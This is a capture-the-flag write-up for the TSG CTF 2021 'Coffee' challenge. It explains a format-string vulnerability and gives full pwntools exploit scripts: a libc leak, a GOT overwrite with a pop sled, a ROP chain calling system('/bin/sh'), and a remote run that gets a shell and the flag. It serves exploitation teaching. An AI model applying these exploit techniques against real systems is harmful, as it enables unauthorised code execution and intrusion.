# TSG CTF 2021 

## Coffee

> 138
> 
> Coffee is essential for pwning.
>
> `nc 34.146.101.4 30002`
>
> [`coffee.tar.gz`](coffee.tar.gz)

Tags: _pwn_ _x86-64_ _stack-pivot_ _got-overwrite_ _format-string_ _rop_ _remote-shell_


## Summary

Format-string exploit to overwrite the GOT with a pop sled that moves the stack pointer to a ROP chain down stack (buf).


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO = GOT overwrite; No PIE = Easy ROP.


### Source Included    

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

> I love these challenges where the exploit is longer than the source code.

`printf(buf);`, there's your vulnerability (BTW, go search for that in Github and see how many hits you get, you'd be surprised--and they're all not CTF challenges).

Normally I'd just change the GOT to have `puts` be `main` and get all the format-string exploits I want, however the `c0ffee` check prevents that naive exploit.

But all is not lost, we just need a pop sled.

```
0x00007fffffffe2c8│+0x0000: 0x0000000000401206  →  <main+112> mov eax, 0x0	 ← $rsp
0x00007fffffffe2d0│+0x0008: "AAAAAAAA"	 ← $r10
0x00007fffffffe2d8│+0x0010: "AAAAAAAA"
0x00007fffffffe2e0│+0x0018: "AAAAAAAA"
0x00007fffffffe2e8│+0x0020: "AAAAAAAA"
0x00007fffffffe2f0│+0x0028: "AAAAAAAA"
0x00007fffffffe2f8│+0x0030: "AAAAAAAA"
0x00007fffffffe300│+0x0038: "AAAAAAAA"
0x00007fffffffe308│+0x0040: "AAAAAAAA"
0x00007fffffffe310│+0x0048: "AAAAAAAA"
0x00007fffffffe318│+0x0050: "AAAAAAAA"
0x00007fffffffe320│+0x0058: "AAAAAAAA"
0x00007fffffffe328│+0x0060: "AAAAAAAA"
0x00007fffffffe330│+0x0068: "AAAAAAAA"
0x00007fffffffe338│+0x0070: "AAAAAAAA"
0x00007fffffffe340│+0x0078: "AAAAAAAA"
0x00007fffffffe348│+0x0080: "AAAAAAAA"
0x00007fffffffe350│+0x0088: "AAAAAAAA"
0x00007fffffffe358│+0x0090: "AAAAAAAA"
0x00007fffffffe360│+0x0098: "AAAAAAAA"
0x00007fffffffe368│+0x00a0: 0x0041414141414141 ("AAAAAAA"?)
0x00007fffffffe370│+0x00a8: 0x00007fffffffe470  →  0x0000000000000001
0x00007fffffffe378│+0x00b0: 0x29057470e9007000
0x00007fffffffe380│+0x00b8: 0x0000000000000000	 ← $rbp
0x00007fffffffe388│+0x00c0: 0x00007ffff7de70b3  →  <__libc_start_main+243> mov edi, eax
```

Above is what the stack looks like right after the call the `puts`.  The `call` pushes the return address to the stack that will be popped into RIP (a.k.a. `ret`) at the end of `puts`; but what if we moved the stack pointer down stack?  Then that `ret` would land in all them `A`'s, where instead of `A`'s we could write out a ROP chain.


### Let's go shopping

Any that have used _ret2csu_ will know exactly where to find a chain of pops to move the stack pointer down:

```
  401286:	48 83 c4 08          	add    rsp,0x8
  40128a:	5b                   	pop    rbx
  40128b:	5d                   	pop    rbp
  40128c:	41 5c                	pop    r12
  40128e:	41 5d                	pop    r13
  401290:	41 5e                	pop    r14
  401292:	41 5f                	pop    r15
  401294:	c3                   	ret
```

Each statement will move the stack pointer down stack and the `ret` will pop the top of the stack into RIP.


### Assembling the exploit

The final exploit should be simple:

1. Use a format-string exploit to leak libc from the stack and GOT overwrite `puts` with our pop sled, and `_start` over.
2. For the second pass we no longer need the format-string exploit, the `puts` pop sled will still be in place, and we now have libc, so we just need to call `system` to get a shell.



## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./coffee')

if args.REMOTE:
    p = remote('34.146.101.4', 30002)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
```

Standard pwntools header.

```python    
whitespace = b'\f\t\r\n\v '
offset = 6
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_sled = binary.search(asm('pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()
```

Setup a few variables:

* `whitespace` is used for the second pass to detect any whitespaces in the payload.  `scanf` will stop reading on any whitespace.  Thanks to ASLR there is a small probability of whitespace.  You could just rerun and get a shell, or check for failure upfront.
* `offset` is the `printf` parameter at the start of our buffer.  In CTF's it is usually `6` for x86\_64.  I'm not going to get into the details here how to discover this; just Google for _format-string exploit howto_--there's a number of good references.  In short, you can enter `%xx$p` where `xx` is `06`-`99` and when the output matches your input you have the offset, or just look at the stack in GDB just before the `printf` statement.
* `pop_rdi` is a ROP gadget within the _No PIE_ `coffee` binary.  With PIE we'd need a base process address leak first.
* `pop_sled` is also a ROP gadget within the `coffee` binary.

> _How many pops do we need?_  That depends on the length of the format-string.  Below my format-string is 32 bytes, so 4 pops to move past that, however the `call` pushes a return address, so we'll need a 5th.
> 
> BTW, that `binary.search` will only work if the assembly is exactly the same as the `objdump` output above (see Analysis section).  There's no magic here.  I prefer this approach vs. hardcoding addresses so that it is easier to read and reuse my code.


```python
payload  = b''
payload += b'%29$018p'
payload += fmtstr_payload(offset+1,{binary.got.puts:pop_sled}, write_size='int', numbwritten=18)
fmtstr_len = len(payload) # padding for next rop chain
payload += p64(binary.sym._start)

p.sendline(payload)

libc.address = int(p.recv(18).decode(),16) - libc.sym.__libc_start_main - 243
log.info('libc.address: ' + hex(libc.address))
```

The initial payload starts with a libc leak; `__libc_start_main+243` to be specific, this can be had by looking at the stack after setting a breakpoint just before `printf`:

```
0x00007fffffffe2d0│+0x0000: "AAAAAAAA"	 ← $rsp, $rdi
0x00007fffffffe2d8│+0x0008: "AAAAAAAA"
0x00007fffffffe2e0│+0x0010: "AAAAAAAA"
0x00007fffffffe2e8│+0x0018: "AAAAAAAA"
0x00007fffffffe2f0│+0x0020: "AAAAAAAA"
0x00007fffffffe2f8│+0x0028: "AAAAAAAA"
0x00007fffffffe300│+0x0030: "AAAAAAAA"
0x00007fffffffe308│+0x0038: "AAAAAAAA"
0x00007fffffffe310│+0x0040: "AAAAAAAA"
0x00007fffffffe318│+0x0048: "AAAAAAAA"
0x00007fffffffe320│+0x0050: "AAAAAAAA"
0x00007fffffffe328│+0x0058: "AAAAAAAA"
0x00007fffffffe330│+0x0060: "AAAAAAAA"
0x00007fffffffe338│+0x0068: "AAAAAAAA"
0x00007fffffffe340│+0x0070: "AAAAAAAA"
0x00007fffffffe348│+0x0078: "AAAAAAAA"
0x00007fffffffe350│+0x0080: "AAAAAAAA"
0x00007fffffffe358│+0x0088: "AAAAAAAA"
0x00007fffffffe360│+0x0090: "AAAAAAAA"
0x00007fffffffe368│+0x0098: 0x0041414141414141 ("AAAAAAA"?)
0x00007fffffffe370│+0x00a0: 0x00007fffffffe470  →  0x0000000000000001
0x00007fffffffe378│+0x00a8: 0x72b51f0db6502200
0x00007fffffffe380│+0x00b0: 0x0000000000000000	 ← $rbp
0x00007fffffffe388│+0x00b8: 0x00007ffff7de70b3  →  <__libc_start_main+243> mov edi, eax
```

If the offset of `6` is at the top of the stack, then counting down to `__libc_start_main+243` should land you at offset `29`, or be lazy and type in GDB/GEF:

```
gef➤  p/d 0xb8 / 8 + 6
$1 = 29
```

To leak this, our format-string starts with `%29$018p`.  This must be 8-bytes in length (stack aligned) and will output the value of the stack at offset `29` with exactly 18 characters (`018p`).

> You can also leak libc address from the GOT using `%s`, see [dead-canary](https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2020/dead-canary#option-1a--option-1-using-s-to-leak-libc) for an example.  Out of habit I use the stack, however, from the GOT, it is consistent between libc versions.

The second part of the format string (`fmtstr_payload(offset+1,{binary.got.puts:pop_sled}, write_size='int', numbwritten=18)`) will overwrite the `puts` GOT entry with our pop sled.  The offset has to be incremented by one since we took up the first stack line with our leak; the `numbwritten=18` has to be set because our leak emitted 18 bytes.  Both are required or the math will be wrong.  I also went with `write_size='int'` to keep the format-string as small as possible.  This will emit a lot of bytes.

The last bit of the payload is a ROP back to `_start` for a second pass.  The `ret` from our pop sled will hit that and give us a fresh `_start`.

The rest of the above snippet just captures the 18 bytes and computes the address of libc.


```python
if args.REMOTE:
    null = payload.find(b'\x00')
    p.recvuntil(payload[null-2:null])
else:
    p.recvuntil(b'\n')
```

The above is not necessary, but necessary for pretty output for write ups.  Oddly this did not work the same locally as it did remotely (first time I'd see this).  All this code does is collect all the garbage from the format-string attack.


```python
payload  = b''
payload += fmtstr_len * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

if any(x in payload for x in whitespace):
    log.critical('whitespace in payload! exiting! try again!')
    sys.exit(1)

p.sendline(payload)
p.interactive()
```

Second pass.  Standard fair ROP chain.  The padding (`fmtstr_len`) was computed from the format-string above.

The whitespace check will catch any whitespace (badchars if you prefer) and report:

```bash
[CRITICAL] whitespace in payload! exiting! try again!
```


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/tsgctf2021/coffee/coffee'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.146.101.4 on port 30002: Done
[*] '/pwd/datajerk/tsgctf2021/coffee/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f5c82d7f000
[*] Switching to interactive mode
$ ls -l
total 28
-r-xr-xr-x 1 root user 16824 Oct  2 04:02 coffee
-r--r--r-- 1 root user    29 Oct  2 04:02 flag-dcf095f41e7bf00fa7e7cf7ef2ce9083
-r-xr-xr-x 1 root user    86 Oct  2 04:02 start.sh
$ cat flag-dcf095f41e7bf00fa7e7cf7ef2ce9083
TSGCTF{Uhouho_gori_gori_pwn}
```


## Extra Credit

### Second `printf`?

_But wait, I want a second `printf` attack!_

This would require resetting the global `x` back to `0xc0ffee` (that is one option).

```python
payload += p64(pop_rsi_r15)
payload += p64(binary.sym.x)
payload += p64(0)
payload += p64(pop_rdi+1) # for scanf
payload += p64(pop_rdi)
payload += p64(binary.search(b'%159s').__next__() + 0x1000)
payload += p64(binary.plt.__isoc99_scanf)
payload += p64(binary.sym._start)
```

> I'm not going to get into the details, this is an exercise left to the reader.  

In short, this will call `scanf` allowing `p.sendline(p64(0xc0ffee))` down script to reset `x`.

Not required for this challenge, but something perhaps to remember for a future challenge.

_Why + 0x1000?_

I found this with GDB/GEF `grep`.  The globals are mirrored to a second page.  You cannot use the first page because it has a whitespace in the address (see below) preventing the entire payload to be read by `scanf`.

```
gef➤  grep %159s
[+] Searching '%159s' in memory
[+] In '/pwd/datajerk/tsgctf2021/coffee/coffee'(0x402000-0x403000), permission=r--
  0x402004 - 0x402009  →   "%159s"
[+] In '/pwd/datajerk/tsgctf2021/coffee/coffee'(0x403000-0x404000), permission=r--
  0x403004 - 0x403009  →   "%159s"
```


### One shot? (well more like 1.5)

> props: https://gist.github.com/moratorium08/164461bcce8dccd76e2fc11ad53dd91c#file-coffee-py-L139

Using the trick from above to get `%159s` for `scanf` it's possible to do this with a single pass:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./coffee')

if args.REMOTE:
    p = remote('34.146.101.4', 30002)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 6

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_rsi_r15 = binary.search(asm('pop rsi; pop r15; ret')).__next__()
pop_seld = binary.search(asm('pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()

payload  = b''
payload += b'%29$018p'
payload += fmtstr_payload(offset+1,{binary.got.puts:pop_seld}, write_size='int', numbwritten=18)
payload += p64(pop_rsi_r15)
payload += p64(binary.got.puts)
payload += p64(0)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'%159s').__next__() + 0x1000)
payload += p64(binary.plt.__isoc99_scanf)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.got.puts + 9)
payload += p64(binary.plt.puts)

p.sendline(payload)

libc.address = int(p.recv(18).decode(),16) - libc.sym.__libc_start_main - 243
log.info('libc.address: ' + hex(libc.address))

p.recvuntil(b'\n') # garbage cleanup

payload  = b''
payload += p64(libc.sym.system)
payload += b'\0/bin/sh\0'

p.sendline(payload)
p.interactive()
```

`scanf` is called to overwrite the `puts` GOT entry with `system`, followed by `/bin/sh` to a known location (`binary.got.puts + 9`), that can be easily pop'd into RDI then called.

Partial RELRO is a gift.
